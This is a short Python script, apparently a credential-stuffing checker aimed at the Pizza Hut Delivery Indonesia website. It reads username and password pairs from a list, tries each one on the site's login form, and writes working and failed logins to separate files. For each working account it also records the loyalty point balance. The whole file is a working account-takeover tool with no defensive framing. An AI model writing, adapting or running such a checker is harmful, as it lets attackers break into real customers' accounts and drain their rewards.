import mechanize
from bs4 import BeautifulSoup

# Read empas PHD
a = []
b = open("list_uncheck.txt", "r")
for c in b:
    for d in c.split():   
        a.append(d.replace('|', ' '))
# Append empas PHD to list
e = []
for f in a:
    e.append(f.split())
# Login & check empas PHD
g = 0
for h in e:
    g += 1
    i = h[0]
    j = h[1]
    # Login
    k = mechanize.Browser()
    k.open("http://www.phd.co.id/id/users/login/")
    k.select_form(id="loginPH")
    k.form['username'] = i
    k.form['password'] = j
    k.submit()
    # Cek Login
    l = BeautifulSoup(k.response().read(),  features ="lxml")
    if l.find('div', {'class': 'container alert-error'}):
        print('[DIE] => |', i, '|', j, '|')
        with open("list_die.txt", "a") as q:
            q.write(str(h))
            q.write(str("\n"))
    else:
        k.open("http://www.phd.co.id/id/accounts")
        l = BeautifulSoup(k.response().read(),  features ="lxml")
        m = l.find('li', {'class': 'owner-poin'}).get_text(strip=True)
        print('[LIVE] => |', i, '|', j, '|', m, '|')
        with open("list_live.txt", "a") as r:
            r.write(str(h))
            r.write(str(m))
            r.write(str("\n"))
